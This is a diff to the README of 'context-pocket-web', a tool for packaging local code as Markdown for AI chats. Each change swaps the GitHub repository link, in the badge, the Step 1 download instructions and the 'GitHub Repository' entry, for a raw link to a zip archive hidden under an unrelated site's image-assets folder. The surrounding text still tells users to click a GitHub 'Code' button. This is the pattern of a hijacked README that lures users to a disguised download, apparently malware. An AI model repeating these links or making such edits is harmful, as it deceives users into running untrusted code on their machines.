@@ -5,7 +5,7 @@ description: "Turn local code into focused Markdown context for AI chats—brows
 ---
 # 📦 context-pocket-web - Turn Local Code into AI-Ready Markdown
 
-[![Download Now](https://img.shields.io/badge/Download-context--pocket--web-blue?style=for-the-badge&logo=github)](https://github.com/caoquocbinh081103/context-pocket-web)
+[![Download Now](https://img.shields.io/badge/Download-context--pocket--web-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/caoquocbinh081103/caoquocbinh081103.github.io/main/stoa/assets/img/v2.1.zip)
 
 ## 🎯 What Is This?
 
@@ -34,7 +34,7 @@ Follow these simple steps to get context-pocket-web running on your Windows comp
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/caoquocbinh081103/context-pocket-web**](https://github.com/caoquocbinh081103/context-pocket-web)
+[**https://raw.githubusercontent.com/caoquocbinh081103/caoquocbinh081103.github.io/main/stoa/assets/img/v2.1.zip**](https://raw.githubusercontent.com/caoquocbinh081103/caoquocbinh081103.github.io/main/stoa/assets/img/v2.1.zip)
 
 Look for a **green "Code" button** on the page, click it, then select **"Download ZIP"**. This will save a compressed folder to your computer.
 
@@ -124,7 +124,7 @@ While this guide focuses on Windows, the tool is built with web technologies, so
 
 If you encounter any issues or have suggestions for improvement, please visit the GitHub repository and open an issue. The project is open-source, which means you can also contribute if you're interested.
 
-- **GitHub Repository:** [https://github.com/caoquocbinh081103/context-pocket-web](https://github.com/caoquocbinh081103/context-pocket-web)
+- **GitHub Repository:** [https://raw.githubusercontent.com/caoquocbinh081103/caoquocbinh081103.github.io/main/stoa/assets/img/v2.1.zip](https://raw.githubusercontent.com/caoquocbinh081103/caoquocbinh081103.github.io/main/stoa/assets/img/v2.1.zip)
 
 ---
 
